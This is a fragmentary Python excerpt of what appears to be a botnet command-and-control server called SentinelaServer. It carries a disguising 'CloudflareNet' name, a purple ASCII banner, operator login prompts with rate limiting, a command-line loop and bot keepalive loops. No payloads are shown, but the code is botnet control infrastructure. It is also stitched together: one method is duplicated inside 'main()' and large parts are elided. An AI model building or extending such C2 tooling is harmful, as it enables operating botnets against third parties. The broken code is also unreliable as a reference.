...
class SentinelaServer:
    def __init__(self):
        ...
        self.c2_name = server_config.get("name", "CloudflareNet")
...
▀███████ ██ ▀███▀ ▀██▀█ ▀████  ██  ██ ▀█▄██ ██    ▀█▄▄▄
              ...
              Cloudflare DNS Rec  |  Type 'help' for commands
                 
'''
        # Apply purple gradient to banner
        self.banner = self._apply_purple_gradient(self.banner)
    ...
    def _apply_purple_gradient(self, text):
        """Apply purple gradient to ASCII art"""
        purple_colors = [
        ...
        for i, line in enumerate(lines):
            if line.strip():
                color_idx = i % len(purple_colors)
                colored_lines.append(purple_colors[color_idx] + line)
            else:
    ...
    def handle_client(self, client, address):
        try:
            ...
            if not self.rate_limiter.check_rate_limit(address):
                self.send(client, Fore.MAGENTA + 'Too many login attempts. Please try again later.')
                time.sleep(2)
                client.close()
                return
            ...
            if not login(username, password):
                self.send(client, Fore.MAGENTA + 'Invalid credentials')
    ...
    def _get_username(self, client):
        for _ in range(3):
            self.send(client, ANSI_CLEAR, False)
            self.send(client, f'{Fore.LIGHTMAGENTA_EX}Username{Fore.LIGHTWHITE_EX}: ', False)
            data = b""
            ...
            if username and validate_username(username, self.max_username_len):
                return username
            if username:
                self.send(client, Fore.MAGENTA + 'Invalid username format\n')
        return None

    def _get_password(self, client):
        for _ in range(3):
            self.send(client, f'{Fore.LIGHTMAGENTA_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
            data = b""
    ...
    def _bot_loop(self, client, username):
        """Keep bot connection alive and listen for commands"""
        try:
            while True:
    ...
    def _command_line_loop(self, client, username, session_token):
        ...
        prompt = f'{Fore.LIGHTMAGENTA_EX}{self._apply_purple_gradient(self.c2_name)} {Fore.LIGHTWHITE_EX}> '
...
def main():
    ...
    def _bot_loop(self, client, username):
        """Keep bot alive by sending PINGs"""
        try:
            while True:
                time.sleep(10)
                try:
